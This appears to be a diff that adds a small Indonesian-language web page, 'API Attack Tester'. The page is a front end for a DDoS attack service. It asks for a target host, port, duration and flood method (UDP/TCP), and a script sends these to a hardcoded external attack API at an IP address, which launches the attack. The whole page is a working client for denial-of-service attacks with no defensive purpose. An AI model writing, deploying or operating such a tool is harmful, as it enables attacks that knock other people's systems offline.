@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API Attack Tester</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            width: 90%;
+            max-width: 500px;
+        }
+
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+            border: none;
+        }
+
+        button {
+            background-color: red;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: darkred;
+        }
+
+        #response {
+            margin-top: 10px;
+            white-space: pre-wrap;
+            text-align: left;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 10px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>API Attack Tester</h2>
+    <div class="container">
+        <label for="host">Host:</label>
+        <input type="text" id="host" placeholder="Masukkan target host (IP/domain)">
+
+        <label for="port">Port:</label>
+        <input type="number" id="port" placeholder="Masukkan port (misal: 80)">
+
+        <label for="time">Time (detik):</label>
+        <input type="number" id="time" placeholder="Durasi serangan dalam detik">
+
+        <label for="method">Metode Serangan:</label>
+        <input type="text" id="method" placeholder="Masukkan metode (misal: UDP, TCP)">
+
+        <button onclick="sendAttack()">Kirim Permintaan</button>
+
+        <h3>Response:</h3>
+        <pre id="response">Menunggu response...</pre>
+    </div>
+
+    <script>
+        function sendAttack() {
+            const host = document.getElementById("host").value;
+            const port = document.getElementById("port").value;
+            const time = document.getElementById("time").value;
+            const method = document.getElementById("method").value;
+
+            if (!host || !port || !time || !method) {
+                alert("Harap isi semua kolom!");
+                return;
+            }
+
+            const apiUrl = `http://170.64.212.98:2032/api?host=${encodeURIComponent(host)}&port=${port}&time=${time}&methods=${encodeURIComponent(method)}`;
+
+            document.getElementById("response").textContent = "Mengirim permintaan...";
+
+            fetch(apiUrl)
+                .then(response => response.text())
+                .then(result => {
+                    document.getElementById("response").textContent = result;
+                })
+                .catch(error => {
+                    document.getElementById("response").textContent = "Error: " + error;
+                });
+        }
+    </script>
+
+</body>
+</html>
